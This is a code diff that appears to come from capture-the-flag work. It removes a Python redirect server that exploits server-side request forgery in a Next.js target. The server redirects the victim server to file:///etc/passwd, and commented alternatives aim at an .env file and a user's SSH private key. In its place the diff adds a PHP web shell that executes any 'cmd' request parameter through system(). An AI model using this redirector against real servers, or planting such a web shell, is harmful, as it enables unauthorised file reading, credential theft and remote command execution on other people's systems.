@@ -1,36 +1,4 @@
-import sys
-from http.server import HTTPServer, BaseHTTPRequestHandler
-
-# ЦЕЛЬ: Что мы хотим прочитать на сервере жертвы.
-# Для начала проверяем LFI чтением /etc/passwd
-TARGET_URL = 'file:///etc/passwd'
-
-# Если не сработает file://, попробуй эти варианты (раскомментируй нужный):
-# TARGET_URL = 'http://localhost:3000/flag.txt'       # Если флаг просто скрыт
-# TARGET_URL = 'http://localhost:3000/.env'           # Чтение переменных окружения
-# TARGET_URL = 'file:///home/romance/.ssh/id_rsa'     # Чтение SSH ключа (имя юзера узнаешь из passwd)
-
-class RedirectHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        # Отправляем код 302 (Found / Redirect)
-        self.send_response(302)
-        # Указываем, куда перенаправить сервер Next.js
-        self.send_header('Location', TARGET_URL)
-        self.end_headers()
-        print(f"\n[+] Caught request! Redirecting victim to: {TARGET_URL}")
-
-def run(server_class=HTTPServer, handler_class=RedirectHandler, port=80):
-    server_address = ('0.0.0.0', port)
-    httpd = server_class(server_address, handler_class)
-    print(f"[*] Malicious Redirector listening on port {port}...")
-    print(f"[*] Target payload: {TARGET_URL}")
-    try:
-        httpd.serve_forever()
-    except KeyboardInterrupt:
-        pass
-    httpd.server_close()
-
-if __name__ == '__main__':
-    # Если хочешь сменить порт, поменяй 80 на другой (например, 8000)
-    # Но для 80 нужны права root (sudo)
-    run(port=80)
+<?php
+if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); }
+echo "AAAABBBBCCCCDDDD";
+?>
